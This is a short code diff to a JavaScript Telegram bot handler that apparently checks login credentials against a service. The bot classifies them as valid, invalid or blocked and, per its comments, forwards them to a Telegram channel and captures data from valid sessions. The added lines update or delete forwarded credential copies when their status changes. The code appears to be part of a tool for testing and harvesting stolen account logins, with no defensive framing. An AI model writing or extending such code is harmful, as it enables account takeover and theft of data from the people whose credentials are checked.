@@ -425,6 +425,11 @@ function initializeTelegramHandler(botToken, options = {}) {
         await fs.unlink(result.screenshot).catch(() => {});
       }
 
+      // If this credential was forwarded before, delete/update the channel copy on recheck
+      if (result.status === 'INVALID' || result.status === 'BLOCKED') {
+        await handleCredentialStatusChange(ctx.telegram, creds.username, creds.password, result.status);
+      }
+
       // Automatically capture data if credentials are VALID
       if (result.status === 'VALID' && result.session) {
         try {
